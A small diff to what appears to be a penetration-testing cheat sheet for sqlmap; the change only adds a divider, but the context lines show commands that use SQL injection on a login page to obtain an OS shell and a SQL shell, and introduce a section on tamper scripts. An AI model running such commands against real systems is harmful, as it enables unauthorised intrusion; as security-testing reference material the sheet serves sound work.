@@ -158,6 +158,8 @@ sqlmap --dbms=mysql -u "http://example.com/login.php" --os-shell
 ```shell
 sqlmap --dbms=mysql -u "http://example.com/login.php" --sql-shell
 ```
+---
+
 ## Best tampers
 > Add to the desired command
 ### All scripts
